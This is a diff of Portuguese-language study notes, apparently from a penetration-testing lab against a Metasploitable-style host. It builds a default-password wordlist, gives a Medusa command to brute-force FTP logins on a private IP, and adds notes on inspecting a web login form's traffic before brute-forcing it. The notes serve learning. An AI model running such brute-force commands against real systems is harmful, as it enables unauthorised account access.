@@ -10,3 +10,7 @@ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt  # criar arquivos para  
 medusa 192.168.10.105 -U users.txt -P pass.txt -M ftp -t 6 # comando que tenta logar no host usando senhas 
 # e usuários das listas dos arquivos pass.txt e users.txt no serviço FTP, usando 6 threads simultaneo. Se
 # der certo aparecerá successful use o ultimo parametro para tentar logae de forma manual.
+
+# Ataque de força bruta em formulário de ligin web
+# Fn F12  # na página para abrir o modo desenvolvedor (inpecionar elementos) ao clicar em network erá possivel vê 
+o que é enviado e recebido
